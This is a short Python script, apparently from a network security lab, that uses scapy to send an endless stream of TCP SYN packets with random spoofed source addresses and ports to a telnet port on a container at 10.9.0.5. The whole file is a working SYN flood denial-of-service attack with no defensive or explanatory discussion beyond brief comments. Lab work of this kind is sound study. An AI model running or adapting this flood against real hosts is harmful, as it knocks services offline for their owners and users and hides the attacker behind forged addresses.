#!/bin/python3
from scapy.all import *
from random import randrange
import sys

# Targeting victim/server container's telnet port
strDestinationIP = "10.9.0.5"
intDestinationPort =  23

while True:  # Run until CTRL+C

    # Pick an arbirtrary source IP address and port number
    intSourcePort = randrange(1, 65535)
    strSourceIP = str(RandIP())
    
    # Build the IP layer of the packet
    lyrIP = IP(src=strSourceIP, dst=strDestinationIP)

    # Build TCP layer of the packet
    lyrTCP = TCP(sport=intSourcePort, dport=intDestinationPort, flags="S", seq=randrange(1,4294967295))
    
    # Build the full packet and show it
    pktSynPacket = lyrIP / lyrTCP
    pktSynPacket.show()

    # Send the packet
    send(pktSynPacket, verbose=0)